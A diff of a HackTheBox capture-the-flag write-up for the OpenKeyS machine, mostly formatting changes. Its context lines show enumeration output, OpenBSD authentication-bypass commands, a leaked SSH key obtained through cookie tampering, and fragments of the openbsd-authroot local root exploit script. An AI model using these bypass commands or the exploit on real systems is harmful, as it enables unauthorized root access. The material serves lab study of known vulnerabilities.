@@ -1,8 +1,8 @@
-# HTB - OpenKeys
+# HTB - OpenKeyS
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/e94d1b31b99c3273b51c6375ae8af67badcc811f/linux-machines/medium/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -10,11 +10,11 @@ Short description to include any strange things to be dealt with
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
@@ -22,7 +22,7 @@ Short description to include any strange things to be dealt with
 
 I started my enumeration with an nmap scan of `10.10.10.199`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ nmap -p- -sCV -n -v -oA openkeys 10.10.10.199                                                 130 ⨯
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-12 18:53 EST
@@ -103,7 +103,7 @@ Only two ports open, 22 - SSH and 80 - HTTP
 
 HTTP leads to login page
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ gobuster dir -u http://10.10.10.199 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
 ===============================================================
@@ -135,10 +135,9 @@ There wasn't anything to do with the login page so I ran gobuster on it, there w
 
 found potential username jennifer in swap file
 
-.swp file is a vim recovery file, can get the file contents back from:
-https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file
+.swp file is a vim recovery file, can get the file contents back from: [https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file](https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ vim -r auth.php.swp
 ```
@@ -184,26 +183,25 @@ function is_active_session()
         return False;
     }
 }
-
 ```
 
-escapeshellcmd ../auth_helpers/check_auth
+escapeshellcmd ../auth\_helpers/check\_auth
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ file check_auth                      
 check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
 ```
 
-googled `/usr/libexec/ld.so` - https://man.netbsd.org/libexec/ld.so.1
+googled `/usr/libexec/ld.so` - [https://man.netbsd.org/libexec/ld.so.1](https://man.netbsd.org/libexec/ld.so.1)
 
-found exploit for this file on openbsd - https://www.exploit-db.com/exploits/47780 
+found exploit for this file on openbsd - [https://www.exploit-db.com/exploits/47780](https://www.exploit-db.com/exploits/47780)
 
 > yields full root privileges.
 
 Will have to remember this one when I gain access to the machine
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ strings check_auth           
 /usr/libexec/ld.so
@@ -296,10 +294,9 @@ _DYNAMIC
 
 OpenBSD, /usr/libexec/ld.so, libc.so.95.1 looked like places to start investigating
 
-https://blog.firosolutions.com/exploits/cve-2019-19521-openbsd-libc-2019/
+[https://blog.firosolutions.com/exploits/cve-2019-19521-openbsd-libc-2019/](https://blog.firosolutions.com/exploits/cve-2019-19521-openbsd-libc-2019/)
 
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ ssh -v -F /dev/null -o PreferredAuthentications=keyboard-interactive -o KbdInteractiveDevices=bsdauth -l -sresponse:passwd 10.10.10.199
 OpenSSH_8.3p1 Debian-1, OpenSSL 1.1.1g  21 Apr 2020
@@ -336,7 +333,7 @@ debug1: Next authentication method: keyboard-interactive
 Connection closed by 10.10.10.199 port 22
 ```
 
-https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html
+[https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html](https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html)
 
 So the system was vulnerable, but I was still not sure how to exploit this to gain access
 
@@ -348,12 +345,11 @@ So the system was vulnerable, but I was still not sure how to exploit this to ga
 
 ### Finding user creds
 
-
 pics above
 
-after seeing that it said no key specified for that user, I tried multiple ways of specifying the only username I had found.  I was able to give the name in the cookie and get a response back!
+after seeing that it said no key specified for that user, I tried multiple ways of specifying the only username I had found. I was able to give the name in the cookie and get a response back!
 
-```
+```text
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
 Connection: close
@@ -410,7 +406,7 @@ qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=<br />
 
 The service gave me an SSH key for the user `jennifer`!
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ ssh jennifer@10.10.10.199 -i jennifer.key 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -457,7 +453,7 @@ Instead of telling me failed password attempt, the machine taunted me, saying "A
 
 ### User.txt
 
-```
+```text
 openkeys$ ls -la
 total 112
 drwxr-xr-x  3 jennifer  jennifer    512 Nov 13 01:30 .
@@ -483,16 +479,16 @@ openkeys$ cat user.txt
 
 ## Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as User <username>
+### Enumeration as User
 
-```
+```text
 openkeys$ su -L -- -schallenge
 Segmentation fault
 ```
 
 the file dead-letter contained
 
-```
+```text
 Date: Thu, 12 Nov 2020 09:00:44 +0000 (UTC)
 To: root
 From: jennifer
@@ -502,7 +498,7 @@ Subject: *** SECURITY information for openkeys.htb ***
 openkeys.htb : Nov 12 09:00:44 : jennifer : user NOT in sudoers ; TTY=ttyp0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/ps -a
 ```
 
-```
+```text
 openkeys$ cat /etc/sudoers
 # $OpenBSD: sudoers,v 1.1.1.1 2015/06/22 15:52:16 millert Exp $
 #
@@ -562,17 +558,16 @@ In the /etc/sudoers file there was an intereseting entry that let www run the `s
 
 ### Getting a shell
 
-
-```
+```text
 openkeys$ uname -a
 OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
 ```
 
 Version is OpenBSD 6.6 x64
 
-searching for root exploit for this led to https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot
+searching for root exploit for this led to [https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot](https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot)
 
-```
+```text
 #!/bin/sh
 # openbsd-authroot - OpenBSD local root exploit for CVE-2019-19520 and CVE-2019-19522
 # Code mostly stolen from Qualys PoCs:
@@ -692,11 +687,11 @@ if [ "$target" = "yubikey" ]; then
 fi
 ```
 
-The exploit was a shell script that I wrote to a file.  It didn't seem to need any configuring so I ran it to see what it would do.
+The exploit was a shell script that I wrote to a file. It didn't seem to need any configuring so I ran it to see what it would do.
 
 How this exploit works:
 
-```
+```text
 openkeys# cat /etc/login.conf
 # $OpenBSD: login.conf,v 1.12 2019/08/19 20:59:14 naddy Exp $
 
@@ -812,7 +807,7 @@ unbound:\
 
 The relevant lines are:
 
-```
+```text
 # Default allowed authentication styles
 auth-defaults:auth=passwd,skey:
 #auth-defaults:auth=passwd:
@@ -821,25 +816,23 @@ auth-defaults:auth=passwd,skey:
 auth-ftp-defaults:auth-ftp=skey:
 ```
 
-Can use BSD's skey to login. 
+Can use BSD's skey to login.
 
-
-> https://man.openbsd.org/skey.1
-> S/Key is a procedure for using one-time passwords to authenticate access to computer systems. It uses 64 bits of information transformed by the MD5, RIPEMD-160, or SHA1 algorithms. The user supplies the 64 bits in the form of 6 English words that are generated by a secure computer. This implementation of S/Key is RFC 2289 compliant.
-
-> Before using skey the system needs to be initialized using skeyinit(1); this will establish a secret passphrase. After that, one-time passwords can be generated using skey, which will prompt for the secret passphrase. After a one-time password has been used to log in, it can no longer be used.
-
+> [https://man.openbsd.org/skey.1](https://man.openbsd.org/skey.1) S/Key is a procedure for using one-time passwords to authenticate access to computer systems. It uses 64 bits of information transformed by the MD5, RIPEMD-160, or SHA1 algorithms. The user supplies the 64 bits in the form of 6 English words that are generated by a secure computer. This implementation of S/Key is RFC 2289 compliant.
+>
+> Before using skey the system needs to be initialized using skeyinit\(1\); this will establish a secret passphrase. After that, one-time passwords can be generated using skey, which will prompt for the secret passphrase. After a one-time password has been used to log in, it can no longer be used.
+>
 > When skey is invoked as otp-method, skey will use method as the hash function where method is currently one of md5, rmd160, or sha1.
-
+>
 > If you misspell your secret passphrase while running skey, you will get a list of one-time passwords that will not work, and no indication of the problem.
-
+>
 > Password sequence numbers count backwards. You can enter the passwords using small letters, even though skey prints them capitalized.
 
-After verifying the type of authentication, then deleting and recreating the skey auth key, the exploit `su`'s to UID 0 (root) using skey as the authentication method.  
+After verifying the type of authentication, then deleting and recreating the skey auth key, the exploit `su`'s to UID 0 \(root\) using skey as the authentication method.
 
 ### Root.txt
 
-```
+```text
 openkeys$ nano .exploit.sh
 openkeys$ chmod +x .exploit.sh                                                                        
 openkeys$ ./.exploit.sh                                                                               
@@ -942,3 +935,4 @@ jennifer:*:1001:1001:Jennifer Miller,,,:/home/jennifer:/bin/ksh
 Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) & [`GibParadox`](https://app.hackthebox.eu/users/125033)for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
